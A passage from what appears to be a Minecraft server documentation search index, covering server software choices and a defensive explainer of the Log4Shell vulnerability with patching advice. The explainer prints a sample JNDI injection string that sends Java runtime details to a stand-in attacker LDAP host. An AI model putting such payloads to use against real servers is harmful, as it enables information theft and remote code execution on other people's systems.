other mods. If you use one that is built around the modded software it will be more stable but likely will have a smaller variety of plugins available. Software to stay away from \u00b6 It is a good idea to stay away from discontinued software and ones that support outdated versions but it's ultimately up to you. If you are deciding between a high-performance software that's not stable, like YatopiaMC was, and one that has less performance but is much more stable it is generally a good idea to go with the one that is more stable. It is also a good idea to stay away from mass-produced server software, they mostly have copy-pasted code and it will quickly lead to a lack of support and abandonment.","title":"Choosing a server software"},{"location":"server/guides/software/picking/#choosing-a-server-software","text":"Here we will go through how to pick the right server software for your server.

The most commonly used vanilla software with plugin support is SpigotMC and its forks, PaperMC , Purpur etc. Another popular vanilla software with plugin support is SpongeVanilla , its primary use is in forge-spigot hybrid servers, in the form of SpongeForge , but it can be used with just vanilla. The SpongeAPI doesn't have as big of a variety of plugins created for it as SpigotMC so you might need to create some of the plugins yourself. There is server software that is designed/optimized for faction/KitPVP or some other types of gamemodes but many are mass-produced and are abandoned quickly.","title":"Vanilla Software"},{"location":"server/guides/software/picking/#custom-software","text":"Custom software is created for better performance mainly targetting minigame servers. Some are trying to recreate the vanilla server with better performance and others are just an API and you need to recode every feature you want in the game. These are mostly good for minigame servers as the vanilla recodes are likely not finished.","title":"Custom Software"},{"location":"server/guides/software/picking/#modded-software","text":"If you want to play with mods you will need a modded server software. There are a few of these but the most popular/still updated ones are Fabric and Forge . There are mod versions of plugins but not as much of a wide variety, hybrid servers (explained below) are better for this. Fabric is more commonly used for servers with mods that act as plugins.","title":"Modded Software"},{"location":"server/guides/software/picking/#hybrid-software","text":"If you are running a hybrid server, mods and plugins, there are a few options. If you are looking for a hybrid server that supports Bukkit plugins it will be less stable than one that is built over the mod software as it mashes two different server software together and plugins may be incompatible with other mods. If you use one that is built around the modded software it will be more stable but likely will have a smaller variety of plugins available.","title":"Hybrid Software"},{"location":"server/guides/software/picking/#software-to-stay-away-from","text":"It is a good idea to stay away from discontinued software and ones that support outdated versions but it's ultimately up to you. If you are deciding between a high-performance software that's not stable, like YatopiaMC was, and one that has less performance but is much more stable it is generally a good idea to go with the one that is more stable. It is also a good idea to stay away from mass-produced server software, they mostly have copy-pasted code and it will quickly lead to a lack of support and abandonment.","title":"Software to stay away from"},{"location":"server/info/exploits/log4j-exploit/","text":"Log4J JNDI Exploit \u00b6 What is Log4J? \u00b6 Log4J is the most popular logging library in the Java world. It is used everywhere. You can name any company, they are probably using it, if they have services running Java. It is so popular, there are many variants for other languages which were inspired by Log4J. Each log message is sent to a set of previously configured \"appenders\" which write or send the data to different locations. This can be a file, database or many others. Log4Shell Vulnerability \u00b6 The exploit was submitted to Apache by Alibaba on November 24, 2021. It was then published in a tweet on December 9, 2021. The vulnerability was given the descriptor \"Log4Shell\" and CVE number CVE-2021-44228 . It was also given the maximum CVSS score: 10/10. This marks it as very severe, as it is used by millions of servers and computer around the world. Lookups \u00b6 Log4J supports lookups . This allows for logging information about the system (time, date, version, ...). This can be done with a simple syntax in the message string you give to Log4J when logging something or in the configuration. Your entered string is then evaluated by Log4J and it then replaces your string with some meaningful data, if you asked for it. I.e. if I want to get the current OS: $ { java : os } This does also work recursively, which means you can nest multiple expressions inside of each other. More on lookups can be found here . Now, this is kind of a problem, but not a that severe one. We'll come to the real big problem of this exploit later. Take the following example: You are running a Minecraft server. Someone is joining with a modified client. The client does not send his real name. Instead, he sends this: $ { java : hw } This is a lookup, which will also be logged and evaluated when logged in the server logs. Instead of this string, it'll log your own hardware information. Now, this isn't really a big problem. This just means you kind of can't really trust your logs anymore. But we're just getting started. JNDI \u00b6 JNDI is the Java Naming and Directory Interface, which is able to lookup data in other services. These can be LDAP, DNS, RMI and some other servers. This is not a part of Log4J and is included in Java. Don't confuse this. Such a lookup could look like this: $ { jndi : ldap : //mycoolserver.com/some-data} How can an attacker make use of this? It works like this: Let's take our example with the minecraft server again. The attacker is joining again and is sending a modified player name: $ { jndi : ldap : //totallytrustworthyserver.tk/${java:runtime}} In this JNDI lookup, Log4J will send a request to the LDAP server at totallytrustworthyserver.tk and will send the servers Java runtime information. Now our attacker already knows the exact Java version and distribution we're running. The LDAP server can also return something, for example a Java object. JNDI will happily accept this response and execute it. Now this is a big problem. Just to rehearse: There is a foreign piece of code with potentially bad instructions in it, that is executed on your server without your knowledge. As this is a complicated topic, we won't go deeper into this. If you want to learn more, you can find good resources online for further reading. How do I secure myself? \u00b6 An important rule in the whole IT is to always install the latest security updates. These also include patches like this one here. If you are using Log4J in your application, make sure to update to version 2.17.0 or later. If you're unable to do this, make sure to remove org.apache.logging.log4j.core.lookup.JndiLookup from your classpath. Note Only log4j-core was affected by this vulnerability. If you're only using log4j-api (i.e. in a Minecraft plugin) your project is not affected. Update your server to the latest version available. Make sure the maintainers have updated their Log4J dependency. Some older versions of some server software may not be maintained anymore. You then have to manually make sure, it's dependency is up to date. Not only servers were affected by this, everyone was. So was also your Minecraft client (the game). If your version is up to date, there is no need to worry. Versions before 1.7 are not affected. Third-party launchers and clients may not be automatically updated. Make sure the maintainers have updated their Log4J.
